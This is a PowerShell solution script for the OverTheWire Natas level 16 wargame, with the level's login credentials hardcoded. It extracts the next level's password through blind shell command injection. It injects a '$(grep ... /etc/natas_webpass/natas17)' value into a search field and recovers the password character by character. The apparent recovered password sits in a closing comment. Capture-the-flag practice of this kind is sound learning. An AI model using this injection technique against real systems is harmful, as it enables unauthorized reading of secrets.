
<#
Script to retrieve the password of level 16-17

#>
$url = 'http://natas16.natas.labs.overthewire.org'
$creds = "natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
# $a = (Invoke-WebRequest -uri $url -Method Get -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a



# <form action="index.php" method="POST">
# Username: <input name="username"><br>
# <input type="submit" value="Check existence" />
# </form>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>

# For security reasons, we now filter even more on certain characters<br/><br/>


#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------

# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean



# --------------------------------------------------------------------------------

# $chars = [char[]]"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
# $cur = ''
# $needle = '$(grep xxx /etc/natas_webpass/natas17)elites'

# $validChars = ''
$parms = @{"submit" = "Search"}

# echo "[x] Getting valid chars"
#     foreach ($c in $chars){
#         $a = $needle -replace("xxx", $c)
#         $parms["needle"] = $a
# $req = (Invoke-WebRequest -uri $url -Method Post -Body $parms  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
# $rsp = ($req | select-string -pattern "elites")

#             if($rsp.matches.count -lt 1){
#                 $validChars += $c
#                     echo $validChars

#             }
#     }


$validChars = [char[]]"bcdghkmnqrswAGHNPQSW035789"
echo "[x] Cracking password"
$needle = '$(grep -E ^xxx /etc/natas_webpass/natas17)elites'

$password = ""
foreach($i in 1..32){

    foreach ($c in $validChars){
         echo "password $password)"

        $password = $password + $c
        $trying = $needle -replace("xxx", $password)
        $parms["needle"] = $trying
        echo "trying $c"
$req = (Invoke-WebRequest -uri $url -Method Post -Body $parms  -proxy "http://localhost:8080" -Headers $headers -WebSession $s).content 
$rsp = ($req | select-string -pattern "elites")

            if($rsp.matches.count -lt 1){
                break
            }else{
                $password = $password.Substring(0, $password.length -1)


            }

    }

}

# voltron@voltron:/tmp$ grep -i "$(grep a me)elites" american-english 
# elites
# voltron@voltron:/tmp$ grep -i "$(grep b me)elites" american-english 
# voltron@voltron:/tmp$ cat me
# b3twiiseV0ltr0n
# voltron@voltron:/tmp$ grep -i "$(grep 0 me)elites" american-english 
# voltron@voltron:/tmp$ grep -i "$(grep 1 me)elites" american-english 
# elites
# voltron@voltron:/tmp$ grep -i "$(grep w me)elites" american-english 
# voltron@voltron:/tmp$ grep -i "$(grep 3 me)elites" american-english 
# voltron@voltron:/tmp$ grep -i "$(grep n me)elites" american-english 
# voltron@voltron:/tmp$ grep -i "$(grep w me)elites" american-english 
# voltron@voltron:/tmp$ grep -i "$(grep W me)elites" american-english 
# elites
# voltron@voltron:/tmp$ grep elites american-english 
# elites
# voltron@voltron:/tmp$ 





# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw